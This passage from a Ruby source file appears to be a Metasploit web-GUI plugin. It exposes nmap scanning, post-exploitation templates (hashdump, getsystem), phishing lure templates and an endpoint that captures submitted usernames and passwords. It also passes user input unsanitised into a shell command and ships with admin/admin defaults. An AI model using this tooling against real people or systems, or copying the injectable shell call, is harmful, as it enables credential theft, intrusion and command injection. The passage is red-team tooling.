          { id: 'services', name: 'Service Detection', args: '-sV -sC' }
        ]
        json_response(profiles)
      end

      post '/api/v1/nmap/scan' do
        body = parse_body
        target = body[:target]
        profile = body[:profile] || 'quick'
        custom_args = body[:args]

        halt 422, json_error('Target required') unless target

        profiles = { 'quick' => '-T4 -F', 'full' => '-T4 -p- -sV -sC', 'stealth' => '-sS -T2', 'udp' => '-sU --top-ports 100', 'vuln' => '-sV --script vuln', 'discovery' => '-sn', 'services' => '-sV -sC' }
        args = profile == 'custom' ? (custom_args || '-T4') : (profiles[profile] || profiles['quick'])

        scan_id = SecureRandom.uuid
        output_file = "/tmp/nmap_#{scan_id}.xml"

        scan = { id: scan_id, target: target, profile: profile, args: args, status: 'running', output_file: output_file, started_at: Time.now.iso8601, hosts: [] }

        Stores.scans.update { |data| data[:scans] ||= []; data[:scans] << scan; data }

        Thread.new do
          system("nmap #{args} -oX #{output_file} #{target}")
          if File.exist?(output_file)
            hosts = parse_nmap_xml(output_file)
            Stores.scans.update do |data|
              idx = data[:scans]&.find_index { |s| s[:id] == scan_id }
              if idx
                data[:scans][idx][:status] = 'completed'
                data[:scans][idx][:completed_at] = Time.now.iso8601
                data[:scans][idx][:hosts] = hosts
              end
              data
            end
          end
        end

        json_response({ id: scan_id, status: 'started', target: target, profile: profile }, status_code: 202)
      end

      get '/api/v1/nmap/scans' do
        data = Stores.scans.load({ scans: [] })
        scans = (data[:scans] || data['scans'] || []).map do |s|
          { id: s[:id], target: s[:target], profile: s[:profile], status: s[:status], started_at: s[:started_at], host_count: (s[:hosts] || []).size }
        end
        json_response(scans)
      end

      get '/api/v1/nmap/scans/:scan_id' do
        data = Stores.scans.load({ scans: [] })
        scan = (data[:scans] || []).find { |s| (s[:id] || s['id']) == params[:scan_id] }
        halt 404, json_error('Scan not found') unless scan
        json_response(scan)
      end

      delete '/api/v1/nmap/scans/:scan_id' do
        scan_id = params[:scan_id]
        Stores.scans.update { |data| data[:scans]&.reject! { |s| (s[:id] || s['id']) == scan_id }; data }
        json_response({ success: true, message: 'Scan deleted' })
      end

      # ==================== Automation ====================

      get '/api/v1/automation/templates' do
        templates = [
          { id: 'windows-postex', name: 'Windows Post-Exploitation', steps: [{ type: 'command', command: 'sysinfo' }, { type: 'command', command: 'getuid' }, { type: 'command', command: 'hashdump' }] },
          { id: 'linux-postex', name: 'Linux Post-Exploitation', steps: [{ type: 'command', command: 'sysinfo' }, { type: 'command', command: 'getuid' }] },
          { id: 'privesc', name: 'Privilege Escalation', steps: [{ type: 'command', command: 'getsystem' }, { type: 'post', module: 'multi/recon/local_exploit_suggester' }] },
          { id: 'credential-harvest', name: 'Credential Harvesting', steps: [{ type: 'command', command: 'hashdump' }] }
        ]
        json_response(templates)
      end

      get '/api/v1/automation' do
        data = Stores.workflows.load({ workflows: [] })
        workflows = data[:workflows] || data['workflows'] || []
        json_response(workflows)
      end

      post '/api/v1/automation' do
        body = parse_body

        workflow = {
          id: SecureRandom.uuid, name: body[:name] || 'Untitled Workflow',
          description: body[:description], steps: body[:steps] || [],
          status: 'pending', current_step: 0, results: [],
          created_at: Time.now.iso8601, updated_at: Time.now.iso8601
        }

        Stores.workflows.update { |data| data[:workflows] ||= []; data[:workflows] << workflow; data }

        json_response(workflow, status_code: 201)
      end

      get '/api/v1/automation/:workflow_id' do
        data = Stores.workflows.load({ workflows: [] })
        workflow = (data[:workflows] || []).find { |w| (w[:id] || w['id']) == params[:workflow_id] }
        halt 404, json_error('Workflow not found') unless workflow
        json_response(workflow)
      end

      delete '/api/v1/automation/:workflow_id' do
        workflow_id = params[:workflow_id]
        Stores.workflows.update { |data| data[:workflows]&.reject! { |w| (w[:id] || w['id']) == workflow_id }; data }
        json_response({ success: true, message: 'Workflow deleted' })
      end

      post '/api/v1/automation/:workflow_id/run' do
        body = parse_body
        workflow_id = params[:workflow_id]
        session_id = body[:session_id]

        halt 422, json_error('Session ID required') unless session_id

        Stores.workflows.update do |data|
          idx = data[:workflows]&.find_index { |w| (w[:id] || w['id']) == workflow_id }
          if idx
            data[:workflows][idx][:status] = 'running'
            data[:workflows][idx][:session_id] = session_id
          end
          data
        end

        json_response({ success: true, message: 'Workflow started', workflow_id: workflow_id })
      end

      get '/api/v1/automation/activity/log' do
        data = Stores.activity.load({ entries: [] })
        entries = (data[:entries] || []).last(500)
        json_response(entries)
      end

      post '/api/v1/automation/activity/log' do
        body = parse_body

        entry = {
          id: SecureRandom.uuid, type: body[:type] || 'info',
          message: body[:message], source: body[:source] || 'manual',
          timestamp: Time.now.iso8601
        }

        Stores.activity.update { |data| data[:entries] ||= []; data[:entries] << entry; data[:entries] = data[:entries].last(10_000); data }

        json_response(entry, status_code: 201)
      end

      # ==================== Reports ====================

      get '/api/v1/reports' do
        data = Stores.reports.load({ reports: [] })
        reports = (data[:reports] || []).map { |r| { id: r[:id], name: r[:name], type: r[:type], created_at: r[:created_at] } }
        json_response(reports)
      end

      post '/api/v1/reports' do
        body = parse_body

        targets = Stores.targets.load({ targets: [] })[:targets] || []
        credentials = Stores.credentials.load({ credentials: [] })[:credentials] || []
        activity = Stores.activity.load({ entries: [] })[:entries] || []
        scans = Stores.scans.load({ scans: [] })[:scans] || []

        report = {
          id: SecureRandom.uuid,
          name: body[:name] || "Report #{Time.now.strftime('%Y-%m-%d')}",
          type: body[:type] || 'engagement',
          data: { targets: targets, credentials: credentials, activity: activity.last(500), scans: scans },
          created_at: Time.now.iso8601
        }

        Stores.reports.update { |data| data[:reports] ||= []; data[:reports] << report; data }

        json_response(report, status_code: 201)
      end

      get '/api/v1/reports/:report_id' do
        data = Stores.reports.load({ reports: [] })
        report = (data[:reports] || []).find { |r| (r[:id] || r['id']) == params[:report_id] }
        halt 404, json_error('Report not found') unless report
        json_response(report)
      end

      delete '/api/v1/reports/:report_id' do
        report_id = params[:report_id]
        Stores.reports.update { |data| data[:reports]&.reject! { |r| (r[:id] || r['id']) == report_id }; data }
        json_response({ success: true, message: 'Report deleted' })
      end

      get '/api/v1/reports/:report_id/export/json' do
        data = Stores.reports.load({ reports: [] })
        report = (data[:reports] || []).find { |r| (r[:id] || r['id']) == params[:report_id] }
        halt 404, json_error('Report not found') unless report

        content_type 'application/json'
        headers['Content-Disposition'] = "attachment; filename=\"#{report[:name]}.json\""
        JSON.pretty_generate(report)
      end

      get '/api/v1/reports/stats/summary' do
        targets = Stores.targets.load({ targets: [] })[:targets] || []
        credentials = Stores.credentials.load({ credentials: [] })[:credentials] || []
        scans = Stores.scans.load({ scans: [] })[:scans] || []

        json_response({
          targets: { total: targets.size },
          sessions: { active: framework.sessions.count },
          credentials: { total: credentials.size },
          scans: { total: scans.size }
        })
      end

      # ==================== Phishing ====================

      get '/api/v1/phishing/templates' do
        data = Stores.phishing_templates.load({ templates: [] })
        json_response(data[:templates] || [])
      end

      get '/api/v1/phishing/templates/prebuilt' do
        templates = [
          { id: 'password-reset', name: 'Password Reset', subject: 'Password Reset Required', category: 'credential-harvest' },
          { id: 'office365', name: 'Office 365 Login', subject: 'Action Required: Verify Your Account', category: 'credential-harvest' },
          { id: 'document-shared', name: 'Document Shared', subject: 'Document Shared With You', category: 'link-click' },
          { id: 'it-support', name: 'IT Support', subject: 'IT Support: Action Required', category: 'payload-delivery' },
          { id: 'invoice', name: 'Invoice', subject: 'Invoice Attached', category: 'payload-delivery' },
          { id: 'security-alert', name: 'Security Alert', subject: 'Security Alert: Suspicious Activity', category: 'credential-harvest' }
        ]
        json_response(templates)
      end

      post '/api/v1/phishing/templates' do
        body = parse_body

        template = {
          id: SecureRandom.uuid, name: body[:name], subject: body[:subject],
          body: body[:body], category: body[:category], created_at: Time.now.iso8601
        }

        Stores.phishing_templates.update { |data| data[:templates] ||= []; data[:templates] << template; data }

        json_response(template, status_code: 201)
      end

      delete '/api/v1/phishing/templates/:template_id' do
        template_id = params[:template_id]
        Stores.phishing_templates.update { |data| data[:templates]&.reject! { |t| (t[:id] || t['id']) == template_id }; data }
        json_response({ success: true, message: 'Template deleted' })
      end

      get '/api/v1/phishing/campaigns' do
        data = Stores.phishing_campaigns.load({ campaigns: [] })
        json_response(data[:campaigns] || [])
      end

      post '/api/v1/phishing/campaigns' do
        body = parse_body

        campaign = {
          id: SecureRandom.uuid, name: body[:name], template_id: body[:template_id],
          landing_page_id: body[:landing_page_id], target_group_id: body[:target_group_id],
          status: 'draft', stats: { sent: 0, opened: 0, clicked: 0, submitted: 0 },
          tracking: [], created_at: Time.now.iso8601
        }

        Stores.phishing_campaigns.update { |data| data[:campaigns] ||= []; data[:campaigns] << campaign; data }

        json_response(campaign, status_code: 201)
      end

      get '/api/v1/phishing/campaigns/:campaign_id' do
        data = Stores.phishing_campaigns.load({ campaigns: [] })
        campaign = (data[:campaigns] || []).find { |c| (c[:id] || c['id']) == params[:campaign_id] }
        halt 404, json_error('Campaign not found') unless campaign
        json_response(campaign)
      end

      delete '/api/v1/phishing/campaigns/:campaign_id' do
        campaign_id = params[:campaign_id]
        Stores.phishing_campaigns.update { |data| data[:campaigns]&.reject! { |c| (c[:id] || c['id']) == campaign_id }; data }
        json_response({ success: true, message: 'Campaign deleted' })
      end

      post '/api/v1/phishing/campaigns/:campaign_id/launch' do
        campaign_id = params[:campaign_id]
        Stores.phishing_campaigns.update do |data|
          idx = data[:campaigns]&.find_index { |c| (c[:id] || c['id']) == campaign_id }
          data[:campaigns][idx][:status] = 'running' if idx
          data
        end
        json_response({ success: true, message: 'Campaign launched' })
      end

      get '/api/v1/phishing/captured' do
        data = Stores.phishing_captured.load({ captured: [] })
        json_response(data[:captured] || [])
      end

      # Tracking endpoints (public)
      get '/api/v1/phishing/track/:tracking_id/open' do
        content_type 'image/gif'
        Base64.decode64('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
      end

      post '/api/v1/phishing/capture/:page_id' do
        captured = {
          id: SecureRandom.uuid, page_id: params[:page_id],
          username: params[:username] || params[:email], password: params[:password],
          ip: request.ip, user_agent: request.user_agent, timestamp: Time.now.iso8601
        }

        Stores.phishing_captured.update { |data| data[:captured] ||= []; data[:captured] << captured; data }

        redirect 'https://www.google.com'
      end

      # ==================== Error Handlers ====================

      error do
        content_type :json
        err = env['sinatra.error']
        JSON.generate({ error: true, message: err&.message || 'Internal error' })
      end

      not_found do
        json_error('Not found', status_code: 404)
      end

      private

      def parse_nmap_xml(filepath)
        return [] unless File.exist?(filepath)

        hosts = []
        doc = REXML::Document.new(File.read(filepath))

        doc.elements.each('nmaprun/host') do |host|
          next unless host.elements['status']&.attributes['state'] == 'up'

          host_info = { ip: nil, hostname: nil, os: nil, services: [] }

          host.elements.each('address') do |addr|
            host_info[:ip] = addr.attributes['addr'] if addr.attributes['addrtype'] == 'ipv4'
          end

          host.elements.each('hostnames/hostname') do |hostname|
            host_info[:hostname] ||= hostname.attributes['name']
          end

          host.elements.each('os/osmatch') do |osmatch|
            host_info[:os] = osmatch.attributes['name']
            break
          end

          host.elements.each('ports/port') do |port|
            next unless port.elements['state']&.attributes['state'] == 'open'

            service = port.elements['service']
            host_info[:services] << {
              port: port.attributes['portid'].to_i,
              protocol: port.attributes['protocol'],
              name: service&.attributes['name'],
              version: service&.attributes['version']
            }
          end

          hosts << host_info
        end

        hosts
      rescue StandardError
        []
      end
    end

    # ============================================================================
    # Plugin Initialization
    # ============================================================================
    def initialize(framework, opts)
      super

      @host = opts['Host'] || '0.0.0.0'
      @port = (opts['Port'] || 8000).to_i

      print_status("Starting Metasploit GUI web server on #{@host}:#{@port}...")

      # Set up the web app
      MsfGuiWebApp.msf_framework = framework
      MsfGuiWebApp.ws_handler = WebSocketHandler.new(framework)
      MsfGuiWebApp.set(:port, @port)
      MsfGuiWebApp.set(:bind, @host)

      # Start server in background
      @server_thread = Thread.new do
        MsfGuiWebApp.run!
      end

      sleep 1

      print_good("Metasploit GUI started on http://#{@host}:#{@port}")
      print_status('Default credentials: admin / admin')
      print_status('API endpoints: /api/v1/*')
      print_status('WebSocket: /socket.io')
      print_status('Use "unload msf_gui" to stop')
    end

    def cleanup
      print_status('Stopping Metasploit GUI server...')

      @server_thread&.kill
      @server_thread&.join(5)

      print_good('Metasploit GUI stopped')
    end

    def name
      'msf_gui'
    end

    def desc
      'Metasploit GUI - Full-featured web interface for Metasploit Framework'
    end
  end
end
